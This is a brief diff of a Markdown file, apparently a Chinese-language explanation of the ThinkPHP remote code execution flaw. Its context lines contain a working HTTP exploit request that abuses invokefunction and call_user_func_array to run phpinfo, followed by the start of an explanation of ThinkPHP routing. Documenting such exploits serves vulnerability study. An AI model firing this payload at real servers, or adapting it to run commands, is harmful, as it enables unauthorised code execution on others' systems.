@@ -15,6 +15,7 @@ markdown
 
 ```http
 GET /index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 HTTP/1.1
+'''
 ## Payload详解：
 thinkphp框架的结构为【模块/控制器/方法】用 '/' 正斜杠隔开
 eg：index.php?s=store/passport/login
